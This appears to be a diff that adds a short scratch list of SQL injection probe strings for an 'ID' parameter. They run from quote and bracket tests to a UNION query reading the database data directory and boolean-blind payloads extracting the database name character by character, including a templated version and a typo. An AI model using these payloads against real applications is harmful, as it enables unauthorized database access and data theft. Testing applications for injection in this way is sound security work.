@@ -1,0 +1,14 @@
+ID:1'
+ID:1
+ID:1
+ID:1'
+ID:1
+ID:12
+ID:12'
+ID:12')
+ID:12')) #
+ID:0' union select 1,2,@@datadir#
+ID:0' or ascii(substr((select database()),{},1))={}
+ID:0' or ascii(substr((select database()),1,1))>1
+ID:0' adn ascii(substr((select database()),1,1))>1
+ID:0' and ascii(substr((select database()),1,1))>1
